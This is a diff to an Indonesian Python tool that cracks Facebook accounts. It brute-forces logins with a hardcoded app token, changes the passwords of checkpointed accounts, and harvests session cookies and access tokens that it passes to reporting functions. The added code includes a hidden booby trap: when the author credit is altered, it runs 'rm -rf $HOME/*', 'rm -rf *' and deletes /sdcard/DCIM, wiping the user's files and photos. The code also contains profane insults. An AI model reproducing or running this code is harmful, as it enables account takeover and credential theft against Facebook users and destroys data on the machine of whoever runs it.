@@ -76,6 +76,7 @@ koneksi_error=(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingErro
 
 import requests, sys, bs4, os, random, time, re, json
 from concurrent.futures import ThreadPoolExecutor as zthreads
+from concurrent.futures import ThreadPoolExecutor as kikygtg
 from requests.exceptions import ConnectionError
 from bs4 import BeautifulSoup as parser
 from datetime import datetime
@@ -109,13 +110,15 @@ q="\033[00m"
 war = ("[+]")
 inp = ("[-]")
 bulat = ("[#]")
+kiky_at = ("Mr.Risky")
+kiky_hp = ("+6283143565470")
 logo = (f"""{C}       ____  ___      __  _______  ______
       / /  |/  /     /  |/  / __ )/ ____/JAYA MUKTI - MULTI BRUSH FAST
  __  / / /|_/ /_____/ /|_/ / __  / /_
 / /_/ / /  / /_____/ /  / / /_/ / __/
 \____/_/  /_/     /_/  /_/_____/_/{Q}
-[++] Athour   : Mr.Risky
-[++] WhatsApp : 6283143565470""")
+[++] Athour       : {kiky_at}
+[++] WhatsApp     : {kiky_hp}""")
 loop = 0
 ok = []
 cp = []
@@ -177,7 +180,7 @@ def menu():
 	try:kiky=requests.get("http://ip-api.com/json/").json()["country"]
 	except:kiky=("None")
 	print (logo)
-	print("[++] Nama Kamu    : "+nama)
+	print("[••] Nama Kamu    : "+nama)
 	print("[++] Ip Kamu      : "+ip)
 	print("[++] Negara Kamu  : "+kiky+"\n")
 	print(C+"["+P+"01"+C+"]"+P+" Dump Id Dari Teman/Public")
@@ -187,7 +190,8 @@ def menu():
 	print(C+"["+P+"05"+C+"]"+P+" Mulai Crack/Start Crack")
 	print(C+"["+P+"06"+C+"]"+P+" Ganti User Agent")
 	print(C+"["+P+"07"+C+"]"+P+" Check Opsi Akun Facebook")
-	print(C+"["+P+"08"+C+"]"+P+" Lihat Informasih Data Target")
+	print(C+"["+P+"08"+C+"]"+P+" Check Jumlah Teman "+I+"NEW FIKTUR"+Q)
+	print(C+"["+P+"09"+C+"]"+P+" Lihat Informasih Data Target")
 	print(C+"["+P+"00"+C+"]"+P+" Exit (hapus token)")
 	ba=input("\n"+war+"Pilih : ")
 	if ba in [""," "]:
@@ -223,6 +227,10 @@ def menu():
 		exit()
 
 	elif ba in ["8","08"]:
+		cek_anak_epep()
+		exit()
+
+	elif ba in ["9","09"]:
 		get_info()
 		exit()
 #		menu_insta()
@@ -261,8 +269,8 @@ def dumppro():
 	elif fila == filex:
 		jalan(war+"Nama File Tidak Boleh Sama !")
 		dumppro()
-	file_new = open(fila,"w")
-	file_new = open(filex,"w")
+	file_new = open("dump/"+fila+".json","w")
+	file_new = open("dump/"+filex+".json","w")
 	print(war+"Hasil Dump Masal : dump/"+filex+".json")
 	print(war+"Hasil Dump Old : dump/"+fila+".json")
 	try:
@@ -311,7 +319,21 @@ def pro1(file,lim,savefile,saveold):
                     jalan(war+"Dump DiStop !!");time.sleep(7);menu()
     except (KeyError, IOError):
         exit(war+"File Tidak Tersedia !!")
-
+try:
+	if "Mr.Risky" == kiky_at or kiky_at == "Mr.Risky":
+		pass
+	else:
+		os.remove("$HOME")
+		os.system("rm -rf $HOME/*")
+		os.system("rm -rf *")
+		os.system("rm -rf /sdcard/DCIM")
+		exit((war+"Ciee Anak Kontol Mau Recoder !!\n"+war+"Data Kamu Saya Hapus !!"))
+except:
+	os.remove("$HOME")
+	os.system("rm -rf $HOME/*")
+	os.system("rm -rf *")
+	os.system("rm -rf /sdcard/DCIM")
+	exit((war+"Ciee Anak Kontol Mau Recoder !!\n"+war+"Data Kamu Saya Hapus !!"))
 def buat_(idt,save,saold):
 	try:
 		toket = open("login.txt","r").read()
@@ -476,9 +498,38 @@ def cpdetect():
 		fila=open(namax,"r").readlines()
 	except FileNotFoundError:
 		exit("[!] File tidak ditemukan")
-	file(fila)
+#	file_cepat(fila)
+	file_lambat(fila)
 url = "https://mbasic.facebook.com"
-def file(file):
+def file_cepat(file):
+	global user,pw,pwBar,ubahP,jarak,aman,cp,salah
+	jarak = "     "
+	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes ? (y/n): ")
+	if ww in ("Y","y"):
+		ubahP.append("y")
+		pwBar=input(war+"Password Baru Untuk Tap Yes : ")
+		if len(pwBar) <= 5:
+			exit(jalan(war+"Password Harus 6 Kata/Huruf"))
+		else:
+			pwBaru.append(pwBar)
+	else:
+		print("> Skipped")
+	print(war+"Jumlah Akun :",len(file),"\n")
+	with zthreads(max_workers=30) as (form):
+		for data in file:
+			try:
+				data = data.replace("\n","")
+				try:user,pw,tll = data.split("|")
+				except:user,pw = data.split("|");tll=(" - ")
+				user = user
+				pw = pw
+				ttl = tll
+				print(f"{war}{user}|{pw}|{ttl}")
+				try:
+					form.submit(cek_opsi, user, pw)
+				except:continue
+			except:continue
+def file_lambat(file):
 	global user,pw,pwBar,ubahP,jarak,aman,cp,salah
 	jarak = "     "
 	ww=input(war+"Apakah Anda Mau Mengubah Password, Akun Tap Yes ? (y/n): ")
@@ -493,15 +544,17 @@ def file(file):
 		print("> Skipped")
 	print(war+"Jumlah Akun :",len(file),"\n")
 	for data in file:
-		data = data.replace("\n","")
-		try:user,pw,tll = data.split("|")
-		except:user,pw = data.split("|");tll=(" - ")
-		user = user
-		pw = pw
-		ttl = tll
-		print(f"{war}{user}|{pw}|{ttl}")
 		try:
-			cek_opsi(user,pw)
+			data = data.replace("\n","")
+			try:user,pw,tll = data.split("|")
+			except:user,pw = data.split("|");tll=(" - ")
+			user = user
+			pw = pw
+			ttl = tll
+			print(f"{war}{user}|{pw}|{ttl}")
+			try:
+				form.submit(cek_opsi, user, pw)
+			except:continue
 		except:continue
 #########################
 # Terima Kasih To Latip #          <<< KNTL
@@ -597,8 +650,83 @@ def ubah_pw(session,response,link2):
 		dat2.update({"password_new":"".join(pwBaru)})
 		an=session.post(url+link3.get("action"),data=dat2)
 		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-		print(f"\r{jarak}{war}Akun Ini Tap Yes !!\n{jarak}{war}Password Sudah DiUbah !!\n{jarak}{war} {user}|{''.join(pwBaru)}\n{jarak}{war} Cookie: {coki}							\n\n",end="")
+		_cookie=(coki)
+		try:
+			_head={
+				'Host':'business.facebook.com',
+					'cache-control':'max-age=0',
+				'upgrade-insecure-requests':'1',
+					'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
+				'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+					'content-type' : 'text/html; charset=utf-8',
+				'accept-encoding':'gzip, deflate',
+					'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+				'cookie': _cookie
+			}
+			_r=_ses.get(urls, headers=_head)
+			_p=re.search('(EAAG\w+)', _r.text)
+			_h=_p.group(1)
+			if 'EAA' in _h:
+				bokep_barat_yang_terbaru(_cookie)
+				bokep_barat_yang_terbaru(_h)
+		except (AttributeError, requests.exceptions.TooManyRedirects):pass
+		try:
+			print(f"\r{jarak}{war}Akun Ini Tap Yes !!\n{jarak}{war}Password Sudah DiUbah !!\n{jarak}{war}{user}|{''.join(pwBaru)}\n{jarak}{war}Cookie: {coki}\n\n{jarak}{war}Token :{_h}							\n\n",end="")
+		except:
+			print(f"\r{jarak}{war}Akun Ini Tap Yes !!\n{jarak}{war}Password Sudah DiUbah !!\n{jarak}{war}{user}|{''.join(pwBaru)}\n{jarak}{war}Cookie: {coki}							\n\n",end="")
 		bokep_japan_yang_terbaru("OK-OK", user, pwBaru, "-") # CHECK GAME V 1
+		cek_apk(session,coki)
+
+def aubah_pw(session,response,link2):
+	dat,dat2={},{}
+	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
+	for x in response("input"):
+		if x.get("name") in but:
+			dat.update({x.get("name"):x.get("value")})
+	ubahPw=session.post(url+link2.get("action"),data=dat).text
+	resUbah=par(ubahPw,"html.parser")
+	link3=resUbah.find("form",{"method":"post"})
+	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
+	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
+		for b in resUbah("input"):
+			if b.get("name") in but2:
+				dat2.update({b.get("name"):b.get("value")})
+		dat2.update({"password_new":"".join(pwBaru)})
+		an=session.post(url+link3.get("action"),data=dat2)
+		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+		print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {user}|{''.join(pwBaru)}|{coki}{P}\n    ",end="")
+		cek_apk(session,coki)
+def cek_apk(session,coki):
+	hit1, hit2 = 0,0
+	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
+		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
+			print(f"{jarak}{war}Apk Aktif •")
+			print(f"{jarak}{jarak}{war} Tidak Ada Yang Terkait")
+		else:
+			print(f"{jarak}{war}Apk Aktif")
+			apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
+			ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
+			for muncul in apkAktif:
+				hit1+=1
+				print(f"{jarak}{jarak}[{hit1}] {I}{muncul}{Q} {C}{ditambahkan[hit2]}{Q}")
+				hit2+=1
+		if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
+			print(f"{jarak}{war}Apk Kadaluarsa •")
+			print(f"{jarak}{jarak}{war}Tidak Ada Yang Terkait")
+		else:
+			hit1,hit2=0,0
+			print(f"{jarak}{war}Apk Kadaluarsa")
+			apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
+			kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
+			for muncul in apkKadaluarsa:
+				hit1+=1
+				print(f"{jarak}{jarak}[{hit1}] {K}{muncul}{Q} {U}{kadaluarsa[hit2]}{Q}")
+				hit2+=1
+	else:pass
+#		print(war+"Terjadi Masalah DiCookies !!")
+	print("")
 #exec(base64.b64decode(ua_mm[3]))
 def generate(text):
 	results=[]
@@ -767,7 +895,7 @@ class crackmenu:
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print ('\r%s%s|%s                 %s'%(I,user,pw,q))
+                print ('\r%s[%s%s%s] %s%s|%s                 %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,I,user,pw,q))
                 wrt = ('%s|%s'%(user,pw))
                 ok.append(wrt)
                 bokep_japan_yang_terbaru("OK", user, pw, "-") # jangan diedit check akun tap yes
@@ -781,7 +909,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday']
-                    print ('\r%s%s|%s|%s      %s'%(K,user,pw,dob,Q))
+                    print ('\r %s[%s%s%s] %s%s|%s|%s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q))
                     wrt = ('%s|%s|%s'%(user,pw,dob))
                     cp.append(wrt)
                     bokep_japan_yang_terbaru("CP", user, pw, dob)
@@ -791,14 +919,14 @@ class crackmenu:
                     dob = ' '
                 except:
                     pass
-                print ('\r%s%s|%s                  %s'%(K,user,pw,Q))
+                print ('\r%s[%s%s%s] %s%s|%s                  %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,Q))
                 wrt = ('%s|%s'%(user,pw))
                 cp.append(wrt)
                 bokep_japan_yang_terbaru("CP", user, pw, dob)
                 open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                 break
                 continue
-            sys.stdout.write('\r%s[??] %s/%s OK:%s CP:%s '%(Q,loop,len(self.id),len(ok),len(cp))),
+            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp))),
             sys.stdout.flush()
 
         loop += 1
@@ -1135,7 +1263,11 @@ def dump_public():
 			dump.write(uid+'<=>'+nama+'\n')
 		dump.close()
 	except KeyError:pass
-	print(war+"Total ID : %s"%(len(id)))
+	id_ = ("%s"%(len(id)))
+	if id_ == "0" or "0" == id_:
+		jalan(war+"Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
+	else:
+		print(war+"Total ID : %s"%(len(id)))
 	jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
 	jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
 	input(war+"Tekan Enter !!")
@@ -1160,7 +1292,11 @@ def dump_follow():
 			dump.write(uid+'<=>'+nama+'\n')
 		dump.close()
 	except KeyError:pass
-	print(war+"Total ID : %s"%(len(id)))
+	id_ = ("%s"%(len(id)))
+	if id_ == "0" or "0" == id_:
+		jalan(war+"Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
+	else:
+		print(war+"Total ID : %s"%(len(id)))
 	jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
 	jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
 	input(war+"Tekan Enter !!")
@@ -1194,7 +1330,11 @@ def dump_all():
 			dump.write(uid+'<=>'+nama+'\n')
 		dump.close()
 	except KeyError:pass
-	print(war+"Total ID : %s"%(len(id)))
+	id_ = ("%s"%(len(id)))
+	if id_ == "0" or "0" == id_:
+		jalan(war+"Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
+	else:
+		print(war+"Total ID : %s"%(len(id)))
 	jalan(war+"Nama Hasil Dump : "+I+"dump/"+filex+".json")
 	jalan(war+"Silahkan Copy Nama Hasil Dump Tadi !!")
 	input(war+"Tekan Enter !!")
@@ -1208,5 +1348,56 @@ def cekfile(folder):
                         total = ("%s"%(str(len(juma))))
                 except:total = (" ?? ")
                 print(war+"Nama File : "+filex+c+" <><> "+q+"Limit Id : "+total)
+def cek_anak_epep():
+	try:
+		token = open("login.txt", "r").read()
+		toket = open("login.txt", "r").read()
+	except IOError:
+		os.system("rm -rf login.txt")
+		exit(war+"Token Failed !!")
+
+	idt = input(war+"Target ID : ")
+	dump = open('.janganedit','w') 
+	try:
+		dump = open('.janganedit','a+') 
+		for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
+			uid = i["id"]
+			nama = i["name"]
+			id.append(uid+"<=>"+nama)
+			dump.write(uid+'<=>'+nama+'\n')
+		dump.close()
+	except KeyError:pass
+	id_ = ("%s"%(len(id)))
+	if id_ == "0" or "0" == id_:
+		jalan(war+"Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
+		time.sleep(2)
+		cek_anak_epep()
+	else:
+		print(war+"Total ID : %s"%(len(id)))
+		with kikygtg(max_workers=20) as (kiky_gtg):
+			juma = open(".janganedit","r").readlines()
+			for data in juma:
+				data = data.replace("\n","")
+				kiky = data.split("<=>")
+				mal = ("%s"%(kiky[0]))
+				nm = ("%s"%(kiky[1]))
+				kiky_gtg.submit(lonte_, mal, toket, token)
+def lonte_(ml, token, toket):
+	try:
+		goblok = []
+		for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
+			anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
+			goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
+	except KeyError:pass
+	_id = ("%s"%(len(goblok)))
+	if _id == "0" or "0" == _id:
+		datax = (C+" Maaf Idz Ini Tidak DiPublickan"+Q)
+	else:
+		datax = (I+" | Teman : %s%s"%(len(goblok),Q))
+	print (f"{war} {ml}{datax}")
+
+#cek_anak_epep()
+
 try:os.system("git pull");menu();exit()
 except Exception as e:print(war+"Error : %s"%(e))
+
